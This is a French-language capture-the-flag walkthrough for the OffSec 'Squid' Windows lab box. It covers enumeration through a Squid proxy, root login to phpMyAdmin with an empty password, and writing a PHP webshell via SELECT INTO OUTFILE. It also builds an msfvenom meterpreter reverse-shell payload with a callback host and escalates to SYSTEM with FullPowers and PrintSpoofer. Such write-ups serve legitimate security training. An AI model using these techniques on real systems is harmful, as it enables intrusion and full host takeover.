---
title: PG-Practice - Squid
meta_title: ""
description: Squid est une box Offsec d'entrainement
date: 2024-06-06T05:00:00Z
image: /images/offsec-banner.jpg
categories:
  - Réaliste
  - Facile
author: Emma.exe
tags:
  - PG-Pratice
  - offsec
  - Réaliste
  - Windows
draft: false
---

## Enumération

{{< tabs >}} {{< tab "Niveau 1" >}}

**Première énumération** :
- Pour la phase d'énumération, commençez par énumérer les services présents sur la machine
- Tâchez de comprendre l'utilité de chacun des services.

**Squid** : 
- Un outil existe pour en apprendre plus sur le contexte actuel de Squid, cependant vous pouvez créer vous-mêmes un script.

**Site web** :
- Renseignez-vous sur les différents composants du site web
- Manuellement, il est plus facile de se connecter sur l'un des services...

{{< /tab >}}
{{< tab "Niveau 2" >}}
On commence par énumérer les ports réseaux de la machine pour découvrir les services ouverts qui y tourne.
On utilise l'option `-Pn` afin de bypass le test de ping. En effet, par défaut, les machines Windows ne répondent pas au ping. Sans cette option, le scan échouera.

```sh
nmap -p- 192.168.173.189 -Pn

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-06 03:42 EDT
Nmap scan report for 192.168.173.189
Host is up (0.021s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3128/tcp  open  squid-http
49666/tcp open  unknown
49667/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 121.37 seconds

```

On découvre un services web nommé "squid-http" sur le port 3128.

On tente d'y accéder depuis l'IP avec le port, mais cela nous renvoie un message d'erreur : 
![[Pasted image 20240606094753.png]]

Plusieurs informations intéressantes peuvent être extraites de la capture : 
- Il faut sûrement accéder au site via un nom d'hôte plutôt que par l'IP
- Il existe un utilisateur nommé "webmaster"
- Le service squid est en version 4.14

On ajoute donc dans notre fichier hosts une entrée pour "squid.lab" : 
```
192.168.173.189 squid.lab
```

En faisant quelques recherches sur SQUID, on tombe sur cette documentation proposé par Hacktricks : https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid

On comprend que SQUID est un proxy, on passe par lui pour accéder à d'autres contenus.

On trouve aussi dans cette documentation un lien vers un outil, spose, qui permet justement de détecter les contenus gardés par Squid.

On clone le repo : 
```sh
git clone https://github.com/aancw/spose.git
```

Et on lance spose.py tel qu'indiqué dans le menu d'aide : 
```sh
python spose.py --proxy http://squid.lab:3128 --target 192.168.173.189
```

Résultats : 
```sh
Using proxy address http://squid.lab:3128
192.168.173.189 3306 seems OPEN 
192.168.173.189 8080 seems OPEN 
```

Les ports 3306 et 8080 sont ouverts.

On peut ainsi configurer le proxy sur notre machine pour accéder à ces ports.

Pour accéder au site web, on peut par exemple, utiliser foxyproxy ou configurer le proxy de son navigateur pour utiliser l'adresse de la machine et le port 3128.

On peut désormais accéder à la page http://192.168.173.189:8080.
Il s'agit d'un serveur WAMP (Windows apache MySQL PHP).

Il y a deux pages d'authentification : celle de Adminer et celle de PHP.

Ces deux pages permettent de se connecter à la base de données MySQL.
{{< /tab >}}
{{< /tabs >}}
## Initial Access

{{< tabs >}} {{< tab "Niveau 1" >}}

Une fois que vous avez accéder à la page web du service vulnérable : 
- Trouvez une façon d'ajouter du contenu au site web à l'aide de requête SQL
- Si vous devez spécifier des chemins, spécifier de façon absolue pour éviter les ambiguïtés.
- Pour récupérer un éventuel reverse-shell, vous pouvez utiliser pwncat-cs, dont la documentation est disponible [ici](../../outils/pwncat-cs)

{{< /tab >}}
{{< tab "Niveau 2" >}}

On sait que l'utilisateur par défaut est root et son mot de passe est vide (source : https://stackoverflow.com/questions/5818358/phpmyadmin-default-login-password).

Lorsque l'on tente cette combinaison sur Adminer, cela nous indique qu'Adminer n'autorise pas les mots de passe vides.
Cependant PHPMyAdmin, l'accepte tout à fait !

Ainsi nous accédons à l'interface de phpMyAdmin.

Nous avons désormais la possibilité de lancer des requêtes SQL en tant que root.

Grâce à la page d'accueil de WAMP, nous savons que nous nous trouvons dans le dossier `C:\wamp\www`.

Notre prochain objectif va donc d'être d'obtenir un shell interactif sur le serveur.

Pour cela plusieurs possibilités : 
- Exécuter des commandes au travers des requêtes
- Ajouter une backdoor dans les pages du site 

La première solution est faisable mais uniquement avec un OS Linux.

Nous allons donc créer une nouvelle page dans le dossier courant. 
A l'intérieur, nous mettons un script PHP qui exécute la commande entrée en argument.

On se sert de la commande "into OUTFILE" de MySQL pour écrire dans un fichier :  
```sql
SELECT "<?php echo shell_exec['c'];die;?>" into OUTFILE "C:\\Wamp\\www\\webshell.php"
```

Une fois la commande exécutée, nous pouvons exécuté les commandes que nous souhaitons sur la page : 
![[Pasted image 20240606162339.png]]

Ainsi, on crafte un reverse-shell en Powershell à l'aide de ce site : https://www.revshells.com.

> Il faut bien penser à l'encoder en URL pour que tous les caractères soient bien pris en compte

On écoute sur le port que l'on a configuré : 
```sh
nc -nlvp 80
```

Une fois l'URL requêté, on obtient un shell interactif.
Le flag se trouve à la racine du disque C:.
{{< /tab >}}
{{< /tabs >}}
## Elévation de privilèges
{{< tabs >}} {{< tab "Niveau 1" >}} 

Vous possédez normalement un shell non privilégié.
Vous souhaitez maintenant vous élever en privilèges.
- Quel utilisateur êtes-vous et quel utilisateur visez-vous ? Effectuer une recherche sur votre moteur de recherche favori afin de voir si des exploits existent.
- Certaines élévations de privilèges se font en plusieurs étapes. Par exemple, l'obtention de plus de privilèges avant l'évélation.

{{< /tab >}}
{{< tab "Niveau 2" >}}
Maintenant que nous possédons un compte de service, nous voulons nous élever en privilèges afin d'obtenir les droits administrateurs.

Création d'un reverse-shell pour meterpreter : 
```sh
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.158 LPORT=80 -f exe -o win_tcp.exe
```

Lancement de meterpreter avec le multi/handler

Lancement du payload depuis le netcat : 
```sh
./met_tcp.exe
```

Trouver un exploit pour passer de Local Service à System : 
https://itm4n.github.io/localservice-privileges/?ref=benheater.com

Exploit à télécharger : https://github.com/itm4n/FullPowers
Voir dans Releases pour avoir le binaire.

Exécution (Basic Usage): 
```sh
FullPowers
```

Vérification que l'exploit a fonctionné : 
```sh
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State  
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
```

-> Nous avons plus de privilèges, notamment le Impersonation Token

Utilisation de printSpofer64.exe : https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0

Exécution : 
```sh
./print.exe -i -c powershell.exe
```

-> Nous sommes désormais en Autorité NT Système

Récupération du flag sur le bureau Administrator.

{{< /tab >}}{{< /tabs >}}
